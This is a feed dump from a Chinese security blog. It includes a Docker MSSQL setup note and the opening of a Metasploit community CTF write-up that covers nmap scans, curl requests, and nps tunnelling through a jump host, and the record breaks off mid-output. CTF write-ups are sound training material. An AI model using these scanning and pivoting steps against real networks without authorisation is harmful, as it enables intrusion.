canvas_nest: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-nest.min.js</span><br><span class="line"></span><br><span class="line">  lazyload: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;vanilla-lazyload&#x2F;dist&#x2F;lazyload.iife.min.js</span><br><span class="line">  instantpage: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instant.page&#x2F;instantpage.min.js</span><br><span class="line">  typed: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;typed.js&#x2F;lib&#x2F;typed.min.js</span><br><span class="line">  pangu: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pangu&#x2F;dist&#x2F;browser&#x2F;pangu.min.js</span><br><span class="line"></span><br><span class="line">  # photo</span><br><span class="line">  fancybox_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@latest&#x2F;dist&#x2F;jquery.fancybox.min.css</span><br><span class="line">  fancybox: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fancyapps&#x2F;fancybox@latest&#x2F;dist&#x2F;jquery.fancybox.min.js</span><br><span class="line">  medium_zoom: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;medium-zoom&#x2F;dist&#x2F;medium-zoom.min.js</span><br><span class="line"></span><br><span class="line">  # snackbar</span><br><span class="line">  snackbar_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;node-snackbar&#x2F;dist&#x2F;snackbar.min.css</span><br><span class="line">  snackbar: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;node-snackbar&#x2F;dist&#x2F;snackbar.min.js</span><br><span class="line"></span><br><span class="line">  # effect</span><br><span class="line">  activate_power_mode: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;activate-power-mode.min.js</span><br><span class="line">  fireworks: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;fireworks.min.js</span><br><span class="line">  click_heart: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;click-heart.min.js</span><br><span class="line">  ClickShowText: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;click-show-text.min.js</span><br><span class="line"></span><br><span class="line">  # fontawesome</span><br><span class="line">  fontawesome: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;@fortawesome&#x2F;fontawesome-free&#x2F;css&#x2F;all.min.css</span><br><span class="line"></span><br><span class="line">  # Conversion between Traditional and Simplified Chinese</span><br><span class="line">  translate: &#x2F;js&#x2F;tw_cn.js</span><br><span class="line"></span><br><span class="line">  # justifiedGallery</span><br><span class="line">  justifiedGallery_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;justifiedGallery&#x2F;dist&#x2F;js&#x2F;jquery.justifiedGallery.min.js</span><br><span class="line">  justifiedGallery_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;justifiedGallery&#x2F;dist&#x2F;css&#x2F;justifiedGallery.min.css</span><br><span class="line"></span><br><span class="line">  # aplayer</span><br><span class="line">  aplayer_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;aplayer&#x2F;dist&#x2F;APlayer.min.css</span><br><span class="line">  aplayer_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;aplayer&#x2F;dist&#x2F;APlayer.min.js</span><br><span class="line">  meting_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;metowolf&#x2F;MetingJS@1.2&#x2F;dist&#x2F;Meting.min.js</span><br><span class="line"></span><br><span class="line">  # Prism.js</span><br><span class="line">  prismjs_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;prism.min.js</span><br><span class="line">  prismjs_lineNumber_js: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;plugins&#x2F;line-numbers&#x2F;prism-line-numbers.min.js</span><br><span class="line">  prismjs_autoloader: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;prismjs&#x2F;plugins&#x2F;autoloader&#x2F;prism-autoloader.min.js</span><br><span class="line"></span><br><span class="line">  artitalk: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;artitalk</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/">https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/</a> ， CYz yyds</p><p><a href="https://mochazz.github.io/2018/04/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.2.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E7%AE%80%E4%BB%8B">https://mochazz.github.io/2018/04/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20%7C%20ThinkPHP3.2.x%E6%A1%86%E6%9E%B6SQL%E6%B3%A8%E2%BC%8A/#ThinkPHP%E7%AE%80%E4%BB%8B</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;明天数据结构反正大概率是挂了，也看不进去书了。不如学点东西，把之前未完成的内容给完成了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>NSSC 2020 9th Final</title>
    <link href="https://hack-for.fun/773c.html"/>
    <id>https://hack-for.fun/773c.html</id>
    <published>2020-12-20T00:46:45.000Z</published>
    <updated>2020-12-21T11:08:55.052Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="797a6d3fa4c43c6cc69876a0da51c5848edabd9351d723acf6722bdccfacb41f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 上使用Docker操作mssql-server</title>
    <link href="https://hack-for.fun/5880.html"/>
    <id>https://hack-for.fun/5880.html</id>
    <published>2020-12-17T13:27:26.000Z</published>
    <updated>2020-12-21T11:23:49.594Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>….。虽然我书本上的东西不会，但是用手敲的东西，比如数据库和java，不能太拉胯，嘿嘿嘿。所以来好好学一下吧，虽然期末仍然可以操作，懂的都懂。</p></blockquote><ul><li>下载Docker 镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull microsoft&#x2F;mssql-server-linux</span><br></pre></td></tr></table></figure><ul><li>创建并运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mssql -m 512m -e &#39;ACCEPT_EULA&#x3D;Y&#39;  -e &#39;SA_PASSWORD&#x3D;PassW@rd123&#39; -p 1433:1433 -d microsoft&#x2F;mssql-server-linux</span><br></pre></td></tr></table></figure><ul><li>进入容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:46:24)──&gt; docker rm 808165fefc8f66c26ef70ffb64282f4ca0c745e73fc4a2c3584c8fef583742cf</span><br><span class="line">808165fefc8f66c26ef70ffb64282f4ca0c745e73fc4a2c3584c8fef583742cf</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:11)──&gt; docker run --name mssql -m 512m -e &#39;ACCEPT_EULA&#x3D;Y&#39;  -e &#39;SA_PASSWORD&#x3D;PassW@rd123&#39; --net&#x3D;host -d microsoft&#x2F;mssql-server-linux</span><br><span class="line">ecce2771ff2b6f42b8bb5aa7fd2a7127403268a632edc091df049ff730249387</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:18)──&gt; docker ps                                         ──(四,1217)─┘</span><br><span class="line">CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">ecce2771ff2b        microsoft&#x2F;mssql-server-linux   &quot;&#x2F;opt&#x2F;mssql&#x2F;bin&#x2F;sqls…&quot;   2 seconds ago       Up 1 second                             mssql</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:20)──&gt; docker ps                                         ──(四,1217)─┘</span><br><span class="line">CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">ecce2771ff2b        microsoft&#x2F;mssql-server-linux   &quot;&#x2F;opt&#x2F;mssql&#x2F;bin&#x2F;sqls…&quot;   5 seconds ago       Up 4 seconds                            mssql</span><br><span class="line">┌─(~)────────────────────────────────────────────────(m0nk3y@RedTeaming:s009)─┐</span><br><span class="line">└─(22:47:23)──&gt; docker exec -it mssql &#x2F;bin&#x2F;bash                   ──(四,1217)─┘</span><br><span class="line">root@docker-desktop:&#x2F;# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@docker-desktop:&#x2F;#</span><br></pre></td></tr></table></figure><ul><li>进入容器连接sql server</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@docker-desktop:&#x2F;# &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P &quot;PassW@rd123&quot;</span><br><span class="line">1&gt;</span><br></pre></td></tr></table></figure><ol><li>如果成功，应会显示 sqlcmd 命令提示符：1&gt;。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─(22:59:47)──&gt; docker exec -it mssql &#x2F;bin&#x2F;bash             137 ↵ ──(四,1217)─┘</span><br><span class="line">root@30138a7c92f6:&#x2F;# &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P &quot;PassW@rd123&quot;</span><br><span class="line">1&gt; SELECT Name from sys.Databases</span><br><span class="line">2&gt; GO</span><br><span class="line">Name</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">master</span><br><span class="line">tempdb</span><br><span class="line">model</span><br><span class="line">msdb</span><br><span class="line"></span><br><span class="line">(4 rows affected)</span><br><span class="line">1&gt;</span><br></pre></td></tr></table></figure><p>![image-20201217231622608](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201217231622608.png)</p><p>OK。</p><p>然后就是学习SqlServer的理论加实操了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;….。虽然我书本上的东西不会，但是用手敲的东西，比如数据库和java，不能太拉胯，嘿嘿嘿。所以来好好学一下吧，虽然期末仍然可以操作，懂的都懂。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;下载Docker 镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;f</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>第一届&quot;祥云杯&quot;网络安全大赛总决赛</title>
    <link href="https://hack-for.fun/b878.html"/>
    <id>https://hack-for.fun/b878.html</id>
    <published>2020-12-11T03:24:36.000Z</published>
    <updated>2020-12-21T11:08:55.053Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="09e1415477309cf2e2c84e7d96f114f1aa6beddf07d663354450a64b76741657"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">有东西被加密了, 请输入密码查看.</summary>
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020 December Metasploit community CTF</title>
    <link href="https://hack-for.fun/d22f.html"/>
    <id>https://hack-for.fun/d22f.html</id>
    <published>2020-12-07T10:52:30.000Z</published>
    <updated>2020-12-11T03:23:03.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>两台靶机：</p><table><thead><tr><th>2020-12-07 10:51:45.687490</th><th>Ubuntu Target</th><th><code>185.245.3.246</code></th><th><a href="https://metasploitctf.com/users/1875">m0nk3y</a></th></tr></thead><tbody><tr><td>2020-12-07 10:51:45.679223</td><td>Kali Jump Host</td><td><code>185.245.3.246</code></td><td><a href="https://metasploitctf.com/users/1875">m0nk3y</a></td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207185354.png" alt="image-20201207185351417"></p><p>Kali 作为跳板机去打 内网Ubuntu。</p><p>Kali : <code>3.85.234.26</code></p><p>Ubuntu: <code>172.15.53.85</code></p><p>题目如下：</p><p>![image-20201207190045534](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207190045534.png)</p><p>ssh 登录 kali</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i metasploit_ctf_kali_ssh_key.pem kali@3.85.234.26</span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207190722932.png)</p><h1 id="直接开淦"><a href="#直接开淦" class="headerlink" title="直接开淦"></a>直接开淦</h1><blockquote><p>When you find a challenge flag, calculate and submit the MD5 checksum of the PNG image to receive points! Hashes are <em>not</em> case sensitive.</p></blockquote><p>说人话，flag就是找到的图片的 md5值，忽略大小写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 9001</span><br><span class="line">        inet 172.15.53.84  netmask 255.255.255.240  broadcast 172.15.53.95</span><br><span class="line">        inet6 fe80::866:3aff:fe77:1953  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 0a:66:3a:77:19:53  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 686  bytes 70099 (68.4 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 767  bytes 81674 (79.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 413  bytes 123225 (120.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 413  bytes 123225 (120.3 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>ifconfig, 可以看到内网ip为 172.15.53.84， 而Ubuntu 目标ip为 172.15.53.85 。为同一个内网ip中。</p><p>nmap 扫端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -v 172.15.53.85</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-07 11:17 UTC</span><br><span class="line">Initiating Ping Scan at 11:17</span><br><span class="line">Scanning 172.15.53.85 [2 ports]</span><br><span class="line">Completed Ping Scan at 11:17, 0.01s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 11:17</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 11:17, 0.00s elapsed</span><br><span class="line">Initiating Connect Scan at 11:17</span><br><span class="line">Scanning 172.15.53.85 [1000 ports]</span><br><span class="line">Discovered open port 8080&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 80&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 8888&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 8200&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9000&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9009&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 5555&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9001&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 9010&#x2F;tcp on 172.15.53.85</span><br><span class="line">Discovered open port 1080&#x2F;tcp on 172.15.53.85</span><br><span class="line">Completed Connect Scan at 11:17, 0.03s elapsed (1000 total ports)</span><br><span class="line">Nmap scan report for 172.15.53.85</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 990 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">1080&#x2F;tcp open  socks</span><br><span class="line">5555&#x2F;tcp open  freeciv</span><br><span class="line">8080&#x2F;tcp open  http-proxy</span><br><span class="line">8200&#x2F;tcp open  trivnet1</span><br><span class="line">8888&#x2F;tcp open  sun-answerbook</span><br><span class="line">9000&#x2F;tcp open  cslistener</span><br><span class="line">9001&#x2F;tcp open  tor-orport</span><br><span class="line">9009&#x2F;tcp open  pichat</span><br><span class="line">9010&#x2F;tcp open  sdr</span><br></pre></td></tr></table></figure><p>开启了80端口，先不忙搭nps隧道啥的，我直接curl 请求一下这个 http web服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl 172.15.53.85</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt;Metasploit CTF&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;styles.css?v&#x3D;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        font-family: sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .h2 &#123;</span><br><span class="line">        font-size: 2em;</span><br><span class="line">        color: #222;</span><br><span class="line">        margin-bottom: 0.2em;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .container &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        display: flex;</span><br><span class="line">        align-items: center;</span><br><span class="line">        justify-content: center;</span><br><span class="line">        flex-direction: column;</span><br><span class="line">        height: 100vh;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;h2&gt;Welcome!&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;4_of_hearts.png&quot; &#x2F;&gt;</span><br><span class="line">            &lt;p&gt;Your remaining challenges are on other ports&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>curl 下载一下这个图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ curl -O 172.15.53.85&#x2F;4_of_hearts.png</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 94015  100 94015    0     0  12.8M      0 --:--:-- --:--:-- --:--:-- 12.8M</span><br><span class="line">kali@kali:~$ ls</span><br><span class="line">4_of_hearts.png  configure_kali.sh</span><br><span class="line">kali@kali:~$ md5sum 4_of_hearts.png</span><br><span class="line">776d1d5ecfb91f71aecad71cb3c7c9d1  4_of_hearts.png</span><br></pre></td></tr></table></figure><p>得到这个flag：776d1d5ecfb91f71aecad71cb3c7c9d1。并且给了hint，Your remaining challenges are on other ports。那就再来一个全端口扫描吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p 1-65535 172.15.53.85</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-12-07 11:34 UTC</span><br><span class="line">Nmap scan report for 172.15.53.85</span><br><span class="line">Host is up (0.0037s latency).</span><br><span class="line">Not shown: 65515 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">1080&#x2F;tcp open  socks</span><br><span class="line">1337&#x2F;tcp open  waste</span><br><span class="line">4545&#x2F;tcp open  worldscores</span><br><span class="line">5555&#x2F;tcp open  freeciv</span><br><span class="line">6868&#x2F;tcp open  acctopus-cc</span><br><span class="line">8080&#x2F;tcp open  http-proxy</span><br><span class="line">8092&#x2F;tcp open  unknown</span><br><span class="line">8101&#x2F;tcp open  ldoms-migr</span><br><span class="line">8123&#x2F;tcp open  polipo</span><br><span class="line">8200&#x2F;tcp open  trivnet1</span><br><span class="line">8201&#x2F;tcp open  trivnet2</span><br><span class="line">8202&#x2F;tcp open  aesop</span><br><span class="line">8888&#x2F;tcp open  sun-answerbook</span><br><span class="line">9000&#x2F;tcp open  cslistener</span><br><span class="line">9001&#x2F;tcp open  tor-orport</span><br><span class="line">9007&#x2F;tcp open  ogs-client</span><br><span class="line">9008&#x2F;tcp open  ogs-server</span><br><span class="line">9009&#x2F;tcp open  pichat</span><br><span class="line">9010&#x2F;tcp open  sdr</span><br></pre></td></tr></table></figure><blockquote><p>有点疑问，有些端口，用浏览器无法正常，curl却能返回一些信息。（原来是有联系的。</p></blockquote><p>因为搞其他8080端口需要交互了，所以得弄个转发，在本机操作一下。</p><p><strong>nps可以不落地配置文件启动：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;npc -server&#x3D;ip:port -vkey&#x3D;web界面中显示的密钥</span><br></pre></td></tr></table></figure><p>nps建立成功后创建隧道。http 和 socks 代理就行啦。(这个时候可以把kali这台机器当做是我们已经GetShell 后的一台边界主机，因为kali 能出网，也能访问内网应用)，kali 机器上安装 npc。</p><p>浏览器和proxychains4设置成nps 代理，这样就能在浏览器和 工具都在代理了。(或者直接用Proxifier</p><p>![image-20201207210033802](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207210033802.png)</p><p>![image-20201207210239170](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201207210239170.png)</p><hr><p>OK, 代理问题解决好了后，就继续淦。</p><h2 id="80端口-4-of-Hearts"><a href="#80端口-4-of-Hearts" class="headerlink" title="80端口 4 of Hearts"></a>80端口 4 of Hearts</h2><p>80端口访问的那张图片的md5.</p><h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><h2 id="4545端口"><a href="#4545端口" class="headerlink" title="4545端口"></a>4545端口</h2><p>![image-20201208003754322](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20201208003754322.png)</p><p>看到simplehttp  和 python，用curl请求一下果然有类似flag的文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC 